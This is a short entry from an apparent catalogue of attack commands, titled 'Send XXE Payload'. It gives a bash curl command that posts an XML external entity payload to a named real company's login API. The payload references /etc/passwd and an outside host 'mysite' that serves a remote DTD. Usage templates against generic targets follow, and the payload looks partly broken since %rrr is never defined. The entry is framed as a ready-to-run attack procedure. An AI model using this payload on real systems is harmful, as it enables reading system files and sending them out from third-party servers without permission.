---
data: >-
  curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"
  encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % b PUBLIC "lol"
  "file:///etc/passwd"> <!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
  %asd; %rrr; ]><login><login></login></login>'
  https://app.informaticaondemand.com/ma/api/v2/user/login
tags:
  - xxe
  - http
type: command
executor: bash
platforms:
  - Linux
id: 5d8e93b0-c233-4a2d-9e86-3098afba5bf7
created_at: '2025-12-13T09:00:27.893Z'
updated_at: '2025-12-13T09:00:27.893Z'
verified: false
validated: true
submitted: true
---
# Send XXE Payload

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % b PUBLIC "lol" "file:///etc/passwd"> <!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html"> %asd; %rrr; ]><login><login></login></login>' https://app.informaticaondemand.com/ma/api/v2/user/login
```

## Description

Sends a crafted XML payload via POST to exploit XXE, triggering entity expansion and external requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/xml"` | Set XML content type | Yes |
| `-d 'payload'` | XML payload data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/xml" -d '...' https://target.com/endpoint
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/xml" -d @payload.xml https://target.com/endpoint
```

## Expected Output

Server response, potentially with errors if XXE is triggered.

## Related

- [[procedures/Send-Malicious-XML-Payload-to-Login-Endpoint]]
